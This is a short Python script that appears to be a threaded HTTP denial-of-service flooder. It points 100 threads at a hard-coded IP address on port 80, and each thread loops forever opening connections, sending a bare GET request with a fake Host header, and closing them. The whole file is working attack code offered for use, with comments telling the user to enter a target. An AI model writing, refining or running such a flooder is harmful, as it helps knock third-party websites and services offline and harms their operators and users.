import threading
import socket

n = 100

target = '216.58.196.196' # Enter Target IP
port = 80 # 22 for SSH server like shell, commandline, website and 80 for http like web interface
proxy = '172.0.0.1'
connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(('GET /' + target + ' HTTP/1.1\r\n').encode('ascii'), (target, port))
        s.sendto(('Host: ' + proxy + '\r\n\r\n').encode('ascii'), (target, port))
        s.close()

        global connected
        connected += 1
        if connected % n == 0:
            print(n)

for i in range(n):
    thread = threading.Thread(target=attack)
    thread.start()